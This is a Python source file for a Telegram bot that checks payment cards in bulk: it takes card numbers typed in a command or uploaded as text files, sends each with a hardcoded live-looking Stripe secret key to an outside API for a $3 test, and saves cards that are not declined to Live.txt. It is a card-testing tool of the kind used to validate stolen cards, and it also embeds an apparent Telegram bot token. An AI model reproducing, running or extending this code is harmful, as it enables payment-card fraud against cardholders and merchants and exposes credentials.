import requests
import time
import json
import os
from telegram import Update
from telegram.ext import CommandHandler, CallbackContext, Application, MessageHandler, filters

MAX_RETRIES = 5

# Function to check the CC
async def check_cc(cc, amount, currency, bot, chat_id, username, vip_status, retry_count=0):
    if retry_count > MAX_RETRIES:
        await bot.send_message(chat_id=chat_id, text=f"{cc} Max retries exceeded.")
        return

    url = "https://api.mvy.ai/"
    params = {
        "lista": cc,
        "sk": "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",
        "amount": amount,
        "currency": currency,
    }

    try:
        start_time = time.time()
        response = requests.get(url, params=params)
        end_time = time.time()
        total_time = end_time - start_time

        if not response.text:
            result = f"{cc} Empty response ❌ Time Taken: {total_time:.2f} seconds"
        else:
            response_data = response.json()
            message = response_data.get('message', '')
            if 'declined' not in message.lower():
                result = f"{message} ✅"
                save_live_response(cc, message)
            else:
                result = f"{message} ❌"

        response_message = f"♤ Card: <code>{cc}</code>\n♤ Response: {result}\n♤ Time Taken: {total_time:.2f}s\n♤ Checked By: @{username} [{vip_status}]\n"
        await bot.send_message(chat_id=chat_id, text=response_message, parse_mode='HTML', disable_web_page_preview=True)

    except requests.exceptions.RequestException as e:
        await bot.send_message(chat_id=chat_id, text=f"{cc} Request Exception: {str(e)}. Retrying...")
        time.sleep(1)
        await check_cc(cc, amount, currency, bot, chat_id, username, vip_status, retry_count + 1)

    except json.JSONDecodeError as e:
        await bot.send_message(chat_id=chat_id, text=f"{cc} JSON Decode Error: {str(e)}")

def save_live_response(cc, message):
    with open('Live.txt', 'a') as file:
        file.write(f"CC: {cc}\nResponse: {message}\n\n")

def is_vip(user_id):
    with open("vip.txt", "r") as file:
        vip_users = file.readlines()
    return str(user_id) + "\n" in vip_users

async def xvv(update: Update, context: CallbackContext):
    try:
        cc = context.args[0]
        parts = cc.split('|')
        if len(parts[2]) == 2:
            parts[2] = '20' + parts[2]
        formatted_cc = ':'.join(parts)
    except IndexError:
        await update.message.reply_text(f"{update.effective_user.username} pls provide cc")
        return
    except Exception:
        await update.message.reply_text(f"{update.effective_user.username} why providing wrong information")
        return

    amount = 3.0
    currency = "usd"
    bot = context.bot
    chat_id = update.effective_chat.id
    username = update.effective_user.username
    user_id = update.effective_user.id
    vip_status = "OWNER" if is_vip(user_id) else "FREE"

    await check_cc(formatted_cc, amount, currency, bot, chat_id, username, vip_status)

async def process_cards(update: Update, context: CallbackContext):
    document = update.message.document
    if not document or document.mime_type != 'text/plain':
        await update.message.reply_text("Please upload a valid TXT file.")
        return

    amount = 3.0
    currency = "usd"
    bot = context.bot
    chat_id = update.effective_chat.id
    username = update.effective_user.username
    user_id = update.effective_user.id
    vip_status = "OWNER" if is_vip(user_id) else "FREE"

    # Download the document
    file = await bot.get_file(document.file_id)
    file_path = file.download(custom_path="temp_cards.txt")

    # Read and process each card from the file
    with open(file_path, 'r') as file:
        cards = file.readlines()
    os.remove(file_path)  # Clean up the downloaded file

    for cc in cards:
        cc = cc.strip()
        if cc:
            await check_cc(cc.replace('|', ':'), amount, currency, bot, chat_id, username, vip_status)

def main():
    bot_token = "7266886772:AAFbSsQc2EiIXZ5XBoU2H7m9ci6mevp7LKQ"
    application = Application.builder().token(bot_token).build()

    # Handle command for text input
    application.add_handler(CommandHandler("xvv", xvv))

    # Handle command for file input
    application.add_handler(MessageHandler(filters.Document.MimeType("text/plain") & filters.Command(".CVV"), process_cards))

    application.run_polling()

if __name__ == "__main__":
    main()
    
